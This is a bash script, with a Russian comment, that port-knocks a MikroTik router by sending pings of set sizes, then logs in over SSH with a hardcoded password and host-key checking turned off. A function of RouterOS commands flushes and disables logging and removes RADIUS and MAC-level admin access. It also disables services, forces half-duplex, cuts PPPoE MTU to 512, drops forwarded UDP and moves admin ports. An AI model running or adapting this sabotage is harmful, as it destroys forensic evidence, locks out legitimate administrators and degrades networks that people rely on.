#!/bin/bash
ip=$1
user=itprovider
password="G0vybv1Gh0-Rkbtyn"
#Простукиваем порты, для открытия.
ping $ip -c 1 -s 100 &>/dev/null || { echo "No ping" && exit 10;}
ping $ip -c 1 -s 437 &>/dev/null
ping $ip -c 1 -s 247 &>/dev/null
ping $ip -c 1 -s 366 &>/dev/null

nmap $ip -n -p 8291,22 | grep -E "open.*ssh" &>/dev/null || { echo "No ssh" && exit 20;}


ssh $user@$ip -o StrictHostKeyChecking=no

fun() {
/system logging action set 0  memory-lines=1
/system logging action set 1  memory-lines=1
/system logging action set 2  memory-lines=1
/system logging action set 3  memory-lines=1
/system logging action set 0  memory-lines=2
/system logging action set 1  memory-lines=2
/system logging action set 2  memory-lines=2
/system logging action set 3  memory-lines=2
/system logging set [/system logging find] disabled=yes
/system logging set [/system logging find] disabled=no
/system logging set [/system logging find] disabled=yes
/system logging set [/system logging find] disabled=no
/system logging set [/system logging find] disabled=yes
/radius remove [/radius find]
/user aaa set use-radius=no
/tool mac-server ping set enabled=no
/tool mac-server set allowed-interface-list=none
/tool mac-server mac-winbox set allowed-interface-list=none
/interface ethernet set [ /interface ethernet find ] full-duplex=no
/interface pppoe-client set [/interface pppoe-client find] max-mru=512 max-mtu=512
/ip service disable [/ip service find  name=telnet]
/ip service disable [/ip service find  name=ftp]
/ip service disable [/ip service find  name=www]
/ip service disable [/ip service find  name=www-ssl]
/ip service disable [/ip service find  name=api]
/ip service disable [/ip service find  name=api-ssl]
/ip firewall filter add chain=forward action=drop protocol=udp connection-limit=1,32
/ip service set winbox port=60000
/ip service set ssh port=60001
}
